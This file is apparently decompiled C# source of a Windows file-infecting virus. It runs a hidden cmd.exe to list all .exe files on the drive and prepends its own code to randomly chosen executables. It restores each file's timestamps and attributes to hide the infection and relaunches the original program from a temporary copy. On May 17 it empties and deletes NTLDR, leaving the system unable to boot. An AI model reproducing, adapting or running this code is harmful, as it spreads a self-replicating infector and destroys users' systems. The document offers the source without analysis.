using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace V1;

[StandardModule]
internal sealed class AT
{
	[STAThread]
	public static void Main()
	{
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		byte[] array = new byte[5120];
		byte[] array2 = new byte[5120];
		string executablePath = Application.get_ExecutablePath();
		Process process = default(Process);
		checked
		{
			string tempFileName;
			int num = default(int);
			try
			{
				FileStream fileStream = new FileStream(executablePath, FileMode.Open, FileAccess.Read);
				fileStream.Read(array, 0, 5120);
				if (new FileInfo(executablePath).Length >= 10240L)
				{
					try
					{
						fileStream.Seek(-5120L, SeekOrigin.End);
						fileStream.Read(array2, 0, 5120);
						fileStream.Close();
						while (true)
						{
							tempFileName = Path.GetTempFileName();
							try
							{
								FileSystem.Kill(tempFileName);
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							tempFileName = StringType.FromObject(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj((object)Path.GetDirectoryName(executablePath), Interaction.IIf(StringType.StrCmp(Strings.Right(Path.GetDirectoryName(executablePath), 1), "\\", false) == 0, (object)"", (object)"\\")), (object)Path.GetFileNameWithoutExtension(tempFileName)), (object)".EXE"));
							try
							{
								FileSystem.SetAttr(tempFileName, (FileAttribute)0);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							try
							{
								File.Copy(executablePath, tempFileName, overwrite: true);
								FileStream fileStream2 = new FileStream(tempFileName, FileMode.Open, FileAccess.Write);
								fileStream2.Write(array2, 0, 5120);
								fileStream2.Close();
								fileStream2 = null;
								process = Process.Start(tempFileName, Interaction.Command());
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								if (num < 10)
								{
									num++;
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							break;
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					fileStream.Close();
				}
				fileStream = null;
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
			string[] array3;
			try
			{
				tempFileName = Path.GetTempFileName();
				Process process2 = new Process();
				ProcessStartInfo startInfo = process2.StartInfo;
				startInfo.FileName = "Cmd.exe";
				startInfo.Arguments = "/c dir \\*.exe /s/b/a-d >" + tempFileName;
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo = null;
				process2.Start();
				process2.WaitForExit();
				process2 = null;
				StreamReader streamReader = new StreamReader(tempFileName);
				array3 = streamReader.ReadToEnd().Split(new char[1] { '\r' });
				streamReader.Close();
				streamReader = null;
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				goto IL_03e3;
			}
			try
			{
				File.Create(tempFileName).Close();
				FileSystem.Kill(tempFileName);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			VBMath.Randomize();
			num = 0;
			int num2 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 25f));
			for (int i = 0; i <= num2; i++)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(Strings.Mid(array3[(int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)array3.Length))], 2));
					byte b;
					DateTime creationTime;
					DateTime lastAccessTime;
					DateTime lastWriteTime;
					FileStream fileStream3;
					if (fileInfo.Length >= 5120L)
					{
						b = (byte)FileSystem.GetAttr(fileInfo.FullName);
						creationTime = fileInfo.CreationTime;
						lastAccessTime = fileInfo.LastAccessTime;
						lastWriteTime = fileInfo.LastWriteTime;
						FileSystem.SetAttr(fileInfo.FullName, (FileAttribute)0);
						fileStream3 = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.ReadWrite);
						fileStream3.Read(array2, 0, 5120);
						if (StringType.StrCmp(BitConverter.ToString(array2), BitConverter.ToString(array), false) != 0)
						{
							fileStream3.Seek(0L, SeekOrigin.Begin);
							fileStream3.Write(array, 0, 5120);
							fileStream3.Seek(0L, SeekOrigin.End);
							fileStream3.Write(array2, 0, 5120);
							goto IL_0369;
						}
						if (num < 30)
						{
							i--;
							num++;
							goto IL_0369;
						}
					}
					else if (num < 30)
					{
						i--;
						num++;
						goto IL_03af;
					}
					goto end_IL_026e;
					IL_03af:
					fileInfo = null;
					continue;
					IL_0369:
					fileStream3.Close();
					fileStream3 = null;
					FileSystem.SetAttr(fileInfo.FullName, (FileAttribute)b);
					fileInfo.CreationTime = creationTime;
					fileInfo.LastAccessTime = lastAccessTime;
					fileInfo.LastWriteTime = lastWriteTime;
					goto IL_03af;
					end_IL_026e:;
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					if (num < 30)
					{
						i--;
						num++;
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				break;
			}
			goto IL_03e3;
		}
		IL_03e3:
		if (!Information.IsNothing((object)process))
		{
			ProcessStartInfo startInfo2 = process.StartInfo;
			try
			{
				process.WaitForExit();
				FileSystem.SetAttr(startInfo2.FileName, (FileAttribute)0);
				File.Create(startInfo2.FileName).Close();
				FileSystem.Kill(startInfo2.FileName);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			startInfo2 = null;
		}
		DateTime today = DateTime.Today;
		if (today.Month == 5 && today.Day == 17)
		{
			try
			{
				string tempFileName = Strings.Left(Environment.SystemDirectory, 3) + "NTLDR";
				FileSystem.SetAttr(tempFileName, (FileAttribute)0);
				File.Create(tempFileName).Close();
				FileSystem.Kill(tempFileName);
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
	}
}
